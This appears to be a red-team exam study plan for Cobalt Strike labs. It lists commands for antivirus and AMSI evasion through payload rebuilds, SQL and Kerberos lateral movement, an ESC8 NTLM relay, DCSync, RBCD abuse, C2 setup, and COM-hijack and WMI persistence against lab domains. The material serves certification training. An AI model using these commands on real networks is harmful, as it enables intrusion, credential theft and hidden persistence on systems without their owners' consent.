# Labs to Practice Before Exam Day

> Generated 2026-04-22. Priority order based on exam failure patterns, lab complexity, and documented gaps.

---

## Tier 1 — Hands-On Practice Required (must run, not just read)

### 1. [Defence Evasion — Artifact Kit + Resource Kit rebuild cycle](/labs/defence-evasion-lab-Malleable.md)

Your notes are solid but this is the #1 exam failure reason. The ThreatCheck → Ghidra → `patch.c` backward-while-loop → rebuild cycle must be muscle memory. Practice the full loop until you can go from dirty artifact to ThreatCheck clean without notes.

**Key steps to drill:**
```bash
# WSL — Artifact Kit rebuild
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
# Edit src-common/patch.c lines ~45 and ~116 → backward while loop
./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

# ThreatCheck — must show NO output (clean)
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"

# WSL — Resource Kit rebuild
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
# VSCode: fix template.x64.ps1 line 5 and line 32
# ThreatCheck AMSI — must show "No threat found"
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
```

---

### 2. [SQL Servers lab](/labs/SQL-Servers-lab.md)

Mechanically the most complex lab. The beacon chain is:

```
wkstn-1 (pchilds) → [steal_token rsteel] → sql-clr → lon-db-1 (SMB)
  → [link from lon-db-1] → lon-db-2 (SMB) → SweetPotato → lon-db-2 (tcp-local SYSTEM)
```

Six documented ⚠️ traps — all from hard experience. The `42000 permission denied` error from running `sql-clr` from the wrong beacon context needs to be avoided physically, not just noted.

**Critical traps to internalise:**
- `sql-clr ... "" lon-db-2` MUST run from wkstn-1 as rsteel — NOT from lon-db-1 mssql_svc beacon
- `link lon-db-2` MUST run from lon-db-1 beacon — it's on a separate network segment
- `sql-checkrpc` before `sql-enablerpc` — confirm state before changing it
- SweetPotato upload path: `C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\`
- `connect localhost 1337` to link tcp-local SYSTEM beacon after SweetPotato fires

---

### 3. [ESC8 NTLM Relay to ADCS](/labs/esc8.md)  

**Setup order (strict):**
1. `socks 1080 socks5` on beacon
2. `sc_config lanmanserver ... 1 4` (disable auto-restart)
3. `sc_stop lanmanserver` → `sc_stop srv2` → `sc_stop srvnet`
4. `rportfwd_local 445 localhost 7445`
5. Add firewall rule for port 445
6. Start ntlmrelayx with proxychains
7. SharpSpoolTrigger to coerce DC auth
8. Catch PFX → proceed with PKINITtools

Practice this until the relay fires in under 10 minutes. Cleanup: restore services, stop SOCKS, stop rportfwd, remove firewall rule.

**incomplete final steps not verified**
---

### 4. [Forest Trusts — Inbound](/labs/Inbound-Trusts-lab.md)

The 3-ticket referral chain and the separate `http/` ticket requirement for `jump winrm64` are the exam traps specifically flagged in the lessons-learned document.

**Inbound trust — ticket chain to internalise:**
```
0. steal_token <DA-pid>
1. dcsync contoso.com CONTOSO\rsteel                           → aes256 hash
2. krb_asktgt /user:rsteel /aes256:<hash>                      → TGT
3. krb_asktgs /service:krbtgt/partner.com /ticket:<TGT>        → INTER-REALM TGT
4. krb_asktgs /service:cifs/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<INTER-REALM>   → CIFS ticket
4b.krb_asktgs /service:http/par-jmp-1.partner.com /targetdomain:partner.com /dc:par-dc-1.partner.com /ticket:<INTER-REALM>   → HTTP ticket (required for jump winrm64)
5. Decode both to .kirbi on attacker desktop
6. kerberos_ticket_use <cifs.kirbi> → ls \\par-jmp-1\c$
7. kerberos_ticket_use <http.kirbi> → jump winrm64 par-jmp-1.partner.com smb
```

**[Outbound trust — TDO DCSync](labs/Outbound-Trusts-lab.md)**  
```cs
beacon> ldapsearch "(&(objectClass=trustedDomain)(trustPartner=contoso.com))" --attributes objectGuid
beacon> dcsync PARTNER\<TDO-GUID>    // extracts RC4/AES inter-realm trust key — note the GUID syntax
```

---

### 5. [RBCD lab](/labs/RBCD-lab.md)  

Seven phases, SOCKS required, three separate execution contexts that must stay straight:

| Context | Used for |
|---------|----------|
| pchilds medium-integrity beacon | SOCKS proxy, krb_tgtdeleg |
| SYSTEM beacon (on wkstn-1) | krb_dump rsteel TGT, krb_dump machine TGT (luid:3e7) |
| runas /netonly powershell (attacker desktop) | Rubeus asktgs LDAP ticket, PowerView ACL enum, Rubeus s4u, Set-ADComputer |

**Critical traps:**
- LON-FS-1 already has LON-WS-1 in `PrincipalsAllowedToDelegateToAccount` — preserve it: `Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1`
- `krb_dump /luid:3e7` NOT `/luid:0x3e7` — Kerbeus-BOF rejects the `0x` prefix
- Rubeus output filename: `_cifs_lon-fs-1` (underscore prefix, no extension) — check exact name in output
- Restore RBCD after use: `Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1`

---

## Tier 2 — Full Dry Run (simulate exam day sequencing)

### 6. CS Team Server Setup — cold-start simulation

Do a complete cold-start dry run from the pre-exam checklist. Time yourself. Target: ready to receive first beacon within 30 minutes of starting.

```
[ ] SSH to team server
[ ] Paste/edit Malleable C2 profile (stage + post-ex + process-inject blocks)
[ ] c2lint → zero [!] errors
[ ] docker restart cobaltstrike-cs-1 → docker logs — no [!]
[ ] Build Artifact Kit → ThreatCheck clean
[ ] Build Resource Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
[ ] Load in CS Script Manager (in order):
      artifact.cna
      resources.cna
      SA.cna  ← MUST be before exam-recon.cna
      Remote.cna
      kerbeus_cs.cna
      exam-recon.cna
[ ] HTTP listener: Host = www.bleepincomputer.com, Port 80
[ ] SMB listener: CUSTOM pipename — NOT TSVCPIPE-*, mojo.*, msagent_*, postex_*, MSSE-*
[ ] DNS listener (for WMI persistence)
[ ] TCP-local port 1337 (for SQL segment)
[ ] Test beacon callback with Defender ON
[ ] spawnto x64 %windir%\sysnative\werfault.exe
[ ] ppid set to explorer.exe PID
```

---

### 7. Unconstrained Delegation + Coercion path

Your notes cover passive TGT harvesting via `krb_triage`. Confirm the active coercion path for when no cached DA TGT exists:

```cs
// Passive — check first (free, no noise)
beacon> krb_triage    // look for krbtgt ticket owned by dyork or DA account

// Active coercion — if no cached DA TGT
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe <DC-IP> <unconstrained-host-IP>
// Then immediately:
beacon> krb_triage    // catch DC machine account TGT that arrives

beacon> krb_dump /luid:<DC-LUID> /service:krbtgt
// Use DC machine TGT for DCSync or S4U2Self path
```

Lab file: `labs/Unconstrained-Delegation-Kerberos-lab.md`

---

### 8. Persistence sequencing (timing matters on exam day)

The exam requires persistence before any break. Losing a beacon because you paused without persistence set costs OPSEC points and potentially the flag chain.

**Sequence to internalise:**
```
First beacon checks in
  → IMMEDIATELY: deploy COM hijack (user-level, no admin needed)
  → Continue with priv esc / lateral movement
  → After SYSTEM beacon: deploy WMI subscription (SYSTEM-level, DNS beacon)
  → Only then: take a break
```

```cs
// COM hijack — deploy on FIRST beacon, before anything else
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
beacon> upload C:\Payloads\http_x64.dll
beacon> mv http_x64.dll Microsoft.Teams.HttpClient.dll
beacon> timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

// WMI subscription — deploy after SYSTEM beacon
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe windbg.exe
beacon> powershell-import C:\Tools\WmiPersistence.ps1
beacon> psinject [SYSTEM-BEACON-PID] x64 Add-WmiPersistence
beacon> execute gpupdate /target:computer /force    // verify trigger
```

Lab files: `labs/Persistence-lab.md`, `labs/Elevated-Persistence-lab.md`

---

## Tier 3 — Cheatsheet Review Only (notes are complete, no lab re-run needed)

| Lab | Notes file | Why review only |
|-----|-----------|-----------------|
| Parent-Child trust / Golden Ticket | `labs/Parent-Child-Trusts.md` | Rubeus `golden` + `kerberos_ticket_use` is straightforward |
| ESC1 | `labs/esc1.md` | 3-step: Certify enum → request cert with SAN → Rubeus asktgt /certificate: |
| DPERSIST1 (Golden Certs) | `labs/dpersist1.md` | CA cert dump → Certify forge (attacker desktop) → Rubeus ptt |
| Constrained Delegation (S4U) | `labs/Constrained-Delegation-kerberos-lab.md` | `/luid:3e7` (no `0x`) trap is documented |
| Kerberoasting / AS-REP | `labs/kerberos-challenge.md` | Simple commands, well covered |
| User Impersonation | `labs/User-Impersonation-lab.md` | steal_token / make_token / kerberos_ticket_use well documented |
| Lateral Movement | `labs/Lateral-Movement-lab.md` | Decision tree is in fast-reference |
| Initial Access + AppLocker | `labs/Initial-Access-lab.md`, `labs/applocker-challenge.md` | ngentask well documented, AppLocker bypass via C:\Windows\Tasks |

---

## Single Biggest OPSEC Risk

**Never disable Defender or Windows Firewall — automatic deduction.**

ESC8 stops `lanmanserver`/`srv2`/`srvnet` to free port 445 — that's a service stop, not Defender. That is allowed. The line is: service control operations are fine, `Set-MpPreference -DisableRealtimeMonitoring $true` or `netsh advfirewall set allprofiles state off` is an instant fail regardless of whether the objective is complete.

---

## Summary Priority

```
MUST practice hands-on:    Defence Evasion → SQL Servers → ESC8 → Forest Trusts → RBCD
Full dry run simulation:   CS Team Server cold-start → Unconstrained coercion path → Persistence sequencing
Review notes only:         ESC1 → DPERSIST1 → Parent-Child trust → Constrained Delegation → Kerberoasting
```
